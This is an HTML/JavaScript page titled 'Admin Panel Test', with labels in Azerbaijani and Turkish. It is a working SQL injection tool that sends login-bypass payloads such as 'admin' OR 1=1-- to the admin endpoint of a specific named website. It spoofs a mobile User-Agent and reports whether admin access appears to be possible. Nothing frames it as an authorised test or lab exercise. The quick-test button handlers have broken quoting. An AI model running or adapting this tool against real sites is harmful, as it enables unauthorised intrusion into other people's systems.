<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Admin Panel Test</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .header p {
            color: #666;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
        }
        .result.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .result.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .payload-selector {
            margin-bottom: 20px;
        }
        .payload-selector select {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 14px;
        }
        .quick-test {
            margin-top: 20px;
            text-align: center;
        }
        .quick-test button {
            margin: 5px;
            padding: 10px 15px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 12px;
            cursor: pointer;
        }
        .quick-test button:hover {
            background: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔓 Admin Panel Test</h1>
            <p>Mobil cihazdan admin panelə giriş testi</p>
        </div>

        <div class="payload-selector">
            <label for="payload">SQL Injection Payload:</label>
            <select id="payload">
                <option value="admin' OR 1=1--">admin' OR 1=1-- (Boolean-based)</option>
                <option value="admin' OR '1'='1'--">admin' OR '1'='1'-- (String-based)</option>
                <option value="admin' OR 1=1#">admin' OR 1=1# (Hash comment)</option>
                <option value="admin' OR 1=1/*">admin' OR 1=1/* (Block comment)</option>
                <option value="' OR 1=1--">' OR 1=1-- (Generic)</option>
                <option value="' OR '1'='1'--">' OR '1'='1'-- (Generic string)</option>
            </select>
        </div>

        <form id="adminForm">
            <div class="form-group">
                <label for="username">İstifadəçi Adı:</label>
                <input type="text" id="username" name="username" placeholder="İstifadəçi adını daxil edin">
            </div>
            
            <div class="form-group">
                <label for="password">Şifrə:</label>
                <input type="password" id="password" name="password" placeholder="Şifrəni daxil edin">
            </div>
            
            <button type="submit" class="btn">🔓 Giriş Et</button>
        </form>

        <div class="quick-test">
            <button onclick="testPayload('admin' OR 1=1--)">Test 1</button>
            <button onclick="testPayload('admin' OR '1'='1'--)">Test 2</button>
            <button onclick="testPayload('admin' OR 1=1#)">Test 3</button>
            <button onclick="testPayload('' OR 1=1--)">Test 4</button>
        </div>

        <div id="result" class="result"></div>
    </div>

    <script>
        // Form submission
        document.getElementById('adminForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                showResult('Zəhmət olmasa bütün sahələri doldurun!', 'error');
                return;
            }
            
            testAdminLogin(username, password);
        });

        // Quick test functions
        function testPayload(payload) {
            document.getElementById('username').value = payload;
            document.getElementById('password').value = 'test';
            testAdminLogin(payload, 'test');
        }

        // Admin login test
        async function testAdminLogin(username, password) {
            showResult('Test edilir...', 'success');
            
            try {
                const response = await fetch('https://royzasmm.com.tr/admin/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
                    },
                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&remember=1`
                });

                const html = await response.text();
                analyzeResponse(html, username);
                
            } catch (error) {
                showResult('Xəta baş verdi: ' + error.message, 'error');
            }
        }

        // Response analysis
        function analyzeResponse(html, username) {
            let result = '';
            let resultClass = 'error';

            // Check for SQL injection success
            if (html.includes('username you entered was found')) {
                result = '✅ SQL Injection Uğurlu! Username tapıldı: ' + username;
                resultClass = 'success';
            }
            // Check for admin access
            else if (html.includes('admin') || html.includes('dashboard')) {
                result = '✅ Admin Content: Admin panelə giriş mümkündür!';
                resultClass = 'success';
            }
            // Check for errors
            else if (html.includes('error') || html.includes('invalid')) {
                result = '❌ Xəta: Giriş uğursuz oldu';
                resultClass = 'error';
            }
            // Generic response
            else {
                result = '⚠️ Cavab alındı, lakin nəticə təyin edilə bilmədi';
                resultClass = 'error';
            }

            // Add response info
            result += '\n\nResponse Length: ' + html.length + ' bytes';
            result += '\nUsername: ' + username;
            
            showResult(result, resultClass);
        }

        // Show result
        function showResult(message, type) {
            const resultDiv = document.getElementById('result');
            resultDiv.textContent = message;
            resultDiv.className = 'result ' + type;
            resultDiv.style.display = 'block';
        }

        // Auto-fill payload on select change
        document.getElementById('payload').addEventListener('change', function() {
            const selectedPayload = this.value;
            document.getElementById('username').value = selectedPayload;
        });

        // Mobile-specific optimizations
        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            document.body.style.fontSize = '16px'; // Prevent zoom on iOS
            document.querySelectorAll('input').forEach(input => {
                input.style.fontSize = '16px';
            });
        }
    </script>
</body>
</html>
